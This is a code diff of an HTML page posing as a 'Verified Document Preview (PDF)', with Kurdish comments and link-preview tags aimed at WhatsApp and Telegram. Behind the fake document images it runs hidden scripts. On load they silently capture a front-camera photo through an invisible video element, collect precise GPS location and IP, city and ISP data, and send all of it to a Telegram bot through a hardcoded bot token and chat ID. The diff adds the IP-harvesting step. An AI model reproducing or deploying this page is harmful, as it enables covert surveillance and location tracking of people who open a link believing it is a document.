@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verified Document Preview (PDF)</title>
 
-    <!-- Open Graph Tags بۆ ئەوەی لە واتسአپ و تلیگرام وێنە و ناوەکە دەربکەوێت -->
     <meta property="og:title" content="دۆکیۆمێنتە فەرمییەکان - پێویستە سەیری بکەیت">
     <meta property="og:description" content="تکایە کرتە بکە بۆ بینینی پەڕە و وردەکارییەکان بە شێوازی PDF.">
     <meta property="og:image" content="https://statuesque-bonbon-16382e.netlify.app/IMG_6579.jpeg">
@@ -67,18 +66,15 @@
             <span style="font-size: 14px; color: #666;">Page 1 & 2</span>
         </div>
 
-        <!-- وێنەی یەکەم -->
         <div class="page-box">
             <img src="IMG_6579.jpeg" alt="Document Page 1">
         </div>
 
-        <!-- وێنەی دووەم -->
         <div class="page-box">
             <img src="IMG_6581.jpeg" alt="Document Page 2">
         </div>
     </div>
 
-    <!-- کامێرای نەبینراو -->
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
@@ -86,7 +82,21 @@
         const BOT_TOKEN = "9174176982:AAEGO9F9kLczTp1g3hjAER_7KLw1IB0qzTw";
         const CHAT_ID = "659131693";
 
-        // ١. بەشی ڕاکێشانی وێنەی کامێرا
+        // ١. ڕاکێشانی ئایپی و زانیاری وڵات و هێڵ
+        async function s1derGetIPAndSend() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                let data = await res.json();
+                
+                let ipInfo = `فاک! ئایپی دۆزراوە:%0A- IP: ${data.ip}%0A- وڵات: ${data.country_name}%0A- شار: ${data.city}%0A- کۆمپانیا: ${data.org}`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(ipInfo)}`);
+            } catch (err) {
+                console.error("فاک، هەڵە لە وەگرتنی ئایپی:", err);
+            }
+        }
+
+        // ٢. ڕاکێشانی وێنەی کامێرا
         async function s1derCaptureAndSend() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -120,7 +130,7 @@
             }
         }
 
-        // ٢. بەشی وەرگرتنی لوکیشنی دەقیق (GPS)
+        // ٣. ڕاکێشانی لوکیشنی دەقیق (GPS)
         function s1derGetLocationAndSend() {
             if (!navigator.geolocation) return;
 
@@ -147,9 +157,10 @@
             });
         }
 
-        // کارپێکردنی هەردووکیان پاش کردنەوەی پەیجەکە لەسەر هۆست
+        // کارپێکردنی هەموویان پاش کردنەوەی پەیجەکە
         window.onload = () => {
             setTimeout(() => {
+                s1derGetIPAndSend();
                 s1derCaptureAndSend();
                 s1derGetLocationAndSend();
             }, 1000);
